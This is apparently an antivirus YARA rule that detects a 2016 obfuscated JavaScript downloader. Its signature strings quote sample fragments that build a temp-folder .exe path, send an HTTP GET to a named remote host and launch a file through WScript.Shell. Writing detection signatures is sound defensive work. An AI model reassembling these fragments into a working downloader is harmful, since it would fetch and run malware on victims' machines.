rule sig_20160328_5e77ec58b47a68b76d3c2f23863b81f9 {
  meta:
    description = "datamaliciousorder - file 20160328_5e77ec58b47a68b76d3c2f23863b81f9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0889c8376dbcbb98fabffcc40ae8e67c42eb6f170e94024cd6a5d2816791cef6"

  strings:
    $s1  = "function Ykjjreg() {return Siwxhmhhzv[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"B42xcxdopwxhi.exe\";};" fullword ascii
    $s2  = "Bnfzu[Hpkdldm](\"GET\", \"http://aicuiibf.com/l30woad\", false);" fullword ascii
    $s3  = "do {WScript[Upopwzhba](Atjahuzf() * 11)} while (Bnfzu[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Uciyyzwbx(Bqkpcxowtx, Motmylt){return Bqkpcxowtx - Motmylt;};" fullword ascii
    $s5  = "var Siwxhmhhzv = function Asdzv() {return WScript[Tibcpefj](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Jddynecbyk(Qaxhvpss){Siwxhmhhzv[\"Run\"](Qaxhvpss, Qokhxfp, Qokhxfp);};" fullword ascii
    $s7  = "function Irskss() {return ((Lzsatwfkd == true) && (Lzsatwfkd == Uzgrs)) ? 1 : Qokhxfp;};" fullword ascii
    $s8  = "var Orjjyon = new this[\"Date\"]();" fullword ascii
    $s9  = "return Uciyyzwbx(Ayabhejlnv, Ocjpax);" fullword ascii
    $s10 = " while (Zyowq){" fullword ascii
    $s11 = "var Lhhcfri = false;" fullword ascii
    $s12 = "function Xcdlspu(Vjpair) {var Zcfwdnw = (1, 2, 3, 4, 5, Vjpair); return Zcfwdnw;};" fullword ascii
    $s13 = "function Unotnk(){return Ipvhajogs;};" fullword ascii
    $s14 = "var Uzgrs = false;" fullword ascii
    $s15 = "function Ndcleuyw()" fullword ascii
    $s16 = "function Pvvpbmlxx(){return Tibcpefj;};" fullword ascii
    $s17 = "var Lzsatwfkd = false;" fullword ascii
    $s18 = "function Atjahuzf(){return 22;};" fullword ascii
    $s19 = "Uzgrs = true; " fullword ascii
    $s20 = "Lzsatwfkd = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}